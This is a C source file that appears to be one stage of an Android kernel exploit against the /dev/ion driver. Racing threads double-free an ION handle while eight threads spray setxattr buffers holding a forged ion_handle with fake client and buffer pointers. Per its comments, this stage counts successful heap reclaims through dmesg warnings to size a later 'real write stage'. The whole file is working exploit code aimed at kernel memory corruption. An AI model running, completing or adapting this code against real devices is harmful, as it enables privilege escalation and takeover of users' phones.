#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/xattr.h>

/* stageB: pure measurement. Zero kernel writes, zero BUG_ON.
 *
 * The sprayed fake ion_handle carries handle_count = 0x7FFFFFF (never reaches 0
 * -> ion_buffer_remove_from_handle never enters its write branch) and
 * id = 0x7FFFFFFF with a zeroed fake client idr -> idr_remove hits its
 * "idr_remove called for id=%d which is not allocated" WARN path, which only
 * prints and returns. dmesg is readable by shell on this device, so each
 * landing is counted exactly. That gives the landing rate per round, which is
 * the only number needed to size the real write stage.
 */
#define H_REF 0x00
#define H_CLIENT 0x08
#define H_BUFFER 0x10
#define H_NODE_PC 0x18
#define H_NODE_R 0x20
#define H_NODE_L 0x28
#define H_KMAP 0x30
#define H_ID 0x34
#define OBJ_SZ 64
#define B_HCNT 0xa8
#define B_VMAS 0x98
#define ION_ALLOC 0xc0204900u
#define ION_FREE 0xc0044901u

static int g_nracer = 3;
static volatile int g_go, g_ready, g_done, g_stop;
static volatile unsigned g_id;
static int g_cfd;
static unsigned char g_tmpl[OBJ_SZ];
static unsigned char *g_bufpg, *g_cli_pg;
static char g_path[128] = "/data/local/tmp/stageB_file";

static void build(void)
{
    memset(g_tmpl, 0, sizeof g_tmpl);
    memset(g_bufpg, 0, 4096);
    memset(g_cli_pg, 0, 4096);
    *(unsigned int *)(g_tmpl + H_REF) = 1;
    *(unsigned long *)(g_tmpl + H_CLIENT) = (unsigned long)g_cli_pg;
    *(unsigned long *)(g_tmpl + H_BUFFER) = (unsigned long)g_bufpg;
    *(unsigned long *)(g_tmpl + H_NODE_PC) = (unsigned long)g_cli_pg | 1;  /* parent = our page, RED */
    *(unsigned int *)(g_tmpl + H_ID) = 0x7fffffffu;   /* > any allocatable id -> WARN path */
    *(unsigned int *)(g_bufpg + B_HCNT) = 0x7fffffffu;
    *(unsigned long *)(g_bufpg + B_VMAS) = (unsigned long)(g_bufpg + B_VMAS);
    *(unsigned long *)(g_bufpg + B_VMAS + 8) = (unsigned long)(g_bufpg + B_VMAS);
}

static void *racer(void *a)
{
    unsigned id = g_id;
    g_ready++;
    while (!g_go) sched_yield();
    ioctl(g_cfd, ION_FREE, &id);
    g_done++;
    return NULL;
}

static void *sprayer(void *a)
{
    int i;
    while (!g_stop) {
        for (i = 0; i < 300; i++) {
            if (g_stop) break;
            setxattr(g_path, "user.v", g_tmpl, OBJ_SZ, 0);
        }
        sched_yield();
    }
    return NULL;
}

static long idr_warns(void)
{
    FILE *f = popen("dmesg | grep -c 'idr_remove called for id'", "r");
    char l[64] = "";
    long n = -1;
    if (f) { if (fgets(l, sizeof l, f)) n = atol(l); pclose(f); }
    return n;
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 30;
    int i, j, fd;
    long base, now, landings;
    pthread_t th[16];

    if (argc > 2) g_nracer = atoi(argv[2]);
    if (argc > 3) { /* spray threads knob unused, fixed 8 */ }
    fd = open(g_path, O_RDWR | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) { perror("file"); return 1; }
    close(fd);
    g_bufpg = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    g_cli_pg = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    g_cfd = open("/dev/ion", O_RDONLY);
    if (g_cfd < 0) { perror("/dev/ion"); return 1; }
    build();
    base = idr_warns();
    printf("stageB (measure only): racers=%d rounds=%d idr_WARN baseline=%ld\n",
           g_nracer, rounds, base);

    for (i = 0; i < 8; i++)
        pthread_create(&th[i], NULL, sprayer, (void *)(long)i);

    for (i = 0; i < rounds; i++) {
        struct ad { unsigned long long len, align; unsigned mask, flags, handle, pad; } a;
        memset(&a, 0, sizeof a);
        a.len = 0x1000; a.align = 4096; a.mask = 1u << 9; a.handle = 0;
        errno = 0;
        if (ioctl(g_cfd, ION_ALLOC, &a)) { printf("alloc errno=%d\n", errno); break; }
        g_id = a.handle; g_go = 0; g_ready = 0; g_done = 0;
        for (j = 0; j < g_nracer; j++)
            pthread_create(&th[8 + j], NULL, racer, (void *)(long)j);
        while (g_ready < (unsigned)g_nracer) sched_yield();
        g_go = 1;
        while (g_done < (unsigned)g_nracer) sched_yield();
        for (j = 0; j < g_nracer; j++) pthread_join(th[8 + j], NULL);
        build();
        if (i % 5 == 4) {
            now = idr_warns();
            printf("  after %2d rounds: idr_WARN=%ld (landings=%ld)\n", i + 1, now, now - base);
        }
    }
    g_stop = 1;
    for (i = 0; i < 8; i++) pthread_join(th[i], NULL);
    now = idr_warns();
    landings = now - base;
    printf("RESULT: rounds=%d landings=%ld  (%.2f per round)\n",
           i, landings, i ? (double)landings / i : 0.0);
    printf("  survival: %s\n", now >= 0 ? "device alive, no BUG_ON hit" : "dmesg unreadable");
    close(g_cfd);
    return 0;
}
